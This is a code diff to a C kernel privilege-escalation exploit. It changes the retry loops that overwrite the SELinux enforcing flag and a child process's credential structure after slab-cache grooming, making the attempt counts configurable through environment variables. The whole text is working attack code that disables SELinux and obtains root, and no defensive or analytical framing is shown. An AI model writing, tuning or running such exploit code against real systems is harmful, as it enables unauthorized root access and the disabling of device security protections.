@@ -511,8 +511,9 @@ int run_exploit(int argc, char **argv) {
   if (!selinux_ok) {
     slab_drain();
     TIMER("pre-W1 drain");
-    for (int att = 1; att <= 5 && !selinux_ok; att++) {
-      pr_info("Write 1 attempt %d/5\n", att);
+    int write1_attempts = env_int_range("W1_ATTEMPTS", 30, 1, 50);
+    for (int att = 1; att <= write1_attempts && !selinux_ok; att++) {
+      pr_info("Write 1 attempt %d/%d\n", att, write1_attempts);
       do_one_write(data_addr(SELINUX_ENFORCING), "W1: SELinux", 1);
       usleep(100000);
       if (check_selinux_off()) { pr_success("SELinux DISABLED\n"); selinux_ok = 1; }
@@ -557,8 +558,9 @@ int run_exploit(int argc, char **argv) {
   pselect_child_node = 1;
 
   int got_root = 0;
-  for (int round = 1; round <= 10 && !got_root; round++) {
-    pr_info("round %d/10: cred write\n", round);
+  int write2_rounds = env_int_range("W2_ROUNDS", 20, 1, 50);
+  for (int round = 1; round <= write2_rounds && !got_root; round++) {
+    pr_info("round %d/%d: cred write\n", round, write2_rounds);
     slab_drain();
     do_one_write(child_task + TASK_CRED_OFF, "W2: cred", 2);
     usleep(50000);
@@ -573,7 +575,7 @@ int run_exploit(int argc, char **argv) {
   close(pipes.cmd_w); close(pipes.uid_r);
 
   if (!got_root) {
-    pr_error("failed after 10 rounds\n");
+    pr_error("failed after %d rounds\n", write2_rounds);
     waitpid(child, NULL, 0);
     return 1;
   }
@@ -663,7 +665,7 @@ static int run_write1_only(void) {
     return 0;
   }
 
-  const int write1_attempts = 20;
+  int write1_attempts = env_int_range("WRITE1_ATTEMPTS", 30, 1, 100);
   for (int att = 1; att <= write1_attempts; att++) {
     slab_drain();
     pr_info("Write 1 attempt %d/%d\n", att, write1_attempts);
